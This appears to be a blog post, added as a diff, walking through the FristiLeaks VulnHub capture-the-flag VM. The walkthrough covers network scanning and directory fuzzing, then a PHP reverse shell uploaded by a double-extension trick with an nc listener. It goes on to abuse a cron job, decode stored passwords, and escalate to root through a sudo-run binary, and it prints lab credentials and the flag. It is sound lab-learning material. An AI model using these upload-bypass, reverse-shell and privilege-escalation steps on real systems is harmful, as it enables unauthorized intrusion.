@@ -1,0 +1,163 @@
+I"• <p>Fun VM and did it on time! <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">Fristileaks</a>
+<p>So, the usual stuff:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>netdiscover <span class="nt">-r</span> 192.168.0.0/16</code></pre></figure>
+
+<p> My target is 192.168.1.90 .
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nmap <span class="nt">-O</span> <span class="nt">-sT</span> 192.168.1.90</code></pre></figure>
+
+<pre>
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-06-01 22:16 WEST
+Nmap scan report for 192.168.1.90
+Host is up (0.00052s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 08:00:27:A5:A6:76 (Cadmus Computer Systems)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+</pre>
+<p> Found a port 80 open. Opened it in firefox and simple page with a image.
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python wfuzz.py <span class="nt">-c</span> <span class="nt">-z</span> file,wordlist/general/common.txt <span class="nt">--hc</span> 404   http://192.168.1.90/FUZZ</code></pre></figure>
+
+<p>Only found one dir, "images".
+<p>In that dir, there was an image http://192.168.1.90/images/3037440.jpg saying "this is not the url you're looking for" ... so what is the url ? Maybe hidden in the image as metadata?
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">exiftool 3037440.jpg</code></pre></figure>
+
+<p>Nope.
+<p>After a while ... a long while, trying to think how to find the correct url i fired nmap and nikto, maybe they could help me.
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>nmap <span class="nt">-A</span> 192.168.1.90</code></pre></figure>
+
+<p>Found some Paths! Like /cola /sisi /beer ... nothing really. Neither one was helping showing the same image grrr...
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./nikto.pl <span class="nt">-mutate</span> 1 <span class="nt">-h</span> 192.168.1.90
+./nikto.pl <span class="nt">-mutate</span> 1,2,3,4,5,6 <span class="nt">-h</span> 192.168.1.90</code></pre></figure>
+
+<p>A big "nope". After another longgg while it hit me!! "/cola", "/beer" and the "Keep calm and drink fristi"!DUH! So, http://192.168.1.90/fristi/
+<p> A login-password form finally and an image! I did a view source and found a comment made by the programmer called eezeepz  and a meta tag. I first pointed at the meta tag saying:
+<pre>
+super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it."
+</pre>
+<p>Scrolling down ther was some base64 code commented. Well i tried to insert that code in the image binary and it returned an image saying something like "kekekekekKEKEKEKEK". "what is this?" I thought, "this can't be a password" but i tried it anyway, login: the user in the comment, password the text in the image and...
+<p>Login!
+<p>Now i could upload a file, the server runs php so i thought of php-reverse-shell upload... error file format not accepted. However, i knew some versions allow something like XXX.php.png and it will run the php code! I renamed it to .png and use the usual suspect for waiting a connection:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lnvvp</span> 12344</code></pre></figure>
+
+<p>Firefox pointing to http://192.168.1.90/fristi/uploads/php-reverse-shell.php.png and
+<p>SHELL!
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">uname</span> <span class="nt">-a</span></code></pre></figure>
+
+<pre>
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+</pre>
+<p>Walking down the /home got to eezeepz home dir, and it had some notes.txt on it:
+<pre>
+o EZ,
+
+I made it possible for you to do some automated checks,
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The
+output goes to the file "cronresult" in /tmp/. It should
+run every minute with my account privileges.
+
+- Jerry
+</pre>
+<p>But the shell was bothering so:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span></code></pre></figure>
+
+<p>Ok, i knew i had to use this, but how ? So at my second try doing something useful i tried:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"/home/admin/chmod 777 /home/admin"</span> <span class="o">&gt;</span>runthis</code></pre></figure>
+
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /home/admin
+<span class="nb">ls</span> <span class="nt">-la</span>
+whoisyourgodnow.txt &lt;- fristigod is owner hmm</code></pre></figure>
+
+<p> Some pass. A encrypt file in python ... should i made a decrypt ?
+<p>i did , and got login for admin:
+<pre>
+import base64,codecs,sys
+
+#def encodeString(str):
+#    base64string= base64.b64encode(str)
+#    return codecs.encode(base64string[::-1], 'rot13')
+
+#cryptoResult=encodeString(sys.argv[1])
+#print cryptoResult
+
+print "----"
+
+def decodeString(str):
+   x=codecs.decode(str[::-1],'rot13')
+   return base64.b64decode(x)
+
+a=decodeString(sys.argv[1])
+print a
+</pre>
+<p>And password for admin is: thisisalsopw123
+<p>Then tried that crypted file owned by fristigod and got another password! :) The password was LetThereBeFristi!
+<p>I was feeling very smart at this moment.. i thought that the fristi<b>god</b> would have some useful files on his home... eh, I still needed root! So more exploring, now I was in fristigod home...wtf nothing. not even hidden.
+<p> So i searched for files owned by the user:
+<pre>
+find / -user fristigod  
+</pre>
+<p> Something hidden in /var ... and a root executable, doCom ? tried to run obviously and:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nice try, but wrong user <span class="p">;</span><span class="o">)</span></code></pre></figure>
+
+<p>ehehe, fristigod can't sudo.. can admin ? noooo. Can i change permission of it like i did for home? i doubt it, but tried it: nah.
+<p>After hitting my head for a while i decided to view .bash_history in /var/fristigod
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="s2">"nothing"</span>
+<span class="s2">"nothing"</span>
+<span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom
+<span class="s2">"nothing, wait what ?"</span></code></pre></figure>
+
+<p>Big duh! again. I tried and it needed a parameter.NO PROBLEM, take this:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh</code></pre></figure>
+
+<p>ROOT!
+<p>Now where is my flag!
+<pre>
+sh-4.1# cd /root
+cd /root
+sh-4.1# ls
+ls
+fristileaks_secrets.txt
+sh-4.1# cat fristileaks_secrets.txt
+cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+
+sh-4.1#
+</pre>
+<p>WEEEEEE! Trully fun, no need for exploits just bad configurations! It was my first VM from start to end without advice, so i can say it was special :)
+<p>Time to check other people solutions!
+</p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p>
+:ET
